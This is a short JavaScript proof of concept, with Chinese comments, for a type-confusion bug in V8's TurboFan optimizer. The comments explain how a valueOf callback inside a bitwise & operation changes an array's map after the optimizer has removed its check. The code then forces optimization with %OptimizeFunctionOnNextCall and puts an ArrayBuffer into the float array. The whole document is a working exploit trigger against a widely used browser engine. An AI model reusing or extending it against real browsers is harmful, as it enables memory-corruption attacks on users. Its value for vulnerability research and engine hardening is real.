
var arr = [1.1, 1.1, 1.2, 1.1, 1.1];
arr.a = 1;
function opt(arr, obj){
  arr.a; //这里用arr.a不用arr[index]的原因是如果用arr[index] 在arr[c]的时候 调用到LoadElimination::ReduceLoadField，该函数
         // 会reduce掉LoadField(arr, element)，进而导致arr[c]获取到的结果不是callback函数修改后的element
  var c = obj & 1;  //调用valueOf Callback修改arr map，由于&操作被赋值nowrite属性，turbofan认为&操作没有side effect，随后会reduce arr[c]之前的checkmap
  return arr[c];
}
var obj = {valueOf:function(){return 1;}}

opt(arr, obj);
opt(arr, obj);
opt(arr, obj);
%OptimizeFunctionOnNextCall(opt);
opt(arr, obj);
%OptimizeFunctionOnNextCall(opt);
var obj = {valueOf:function(){arr[2] = new ArrayBuffer();return 2;}};
console.log(opt(arr, obj));
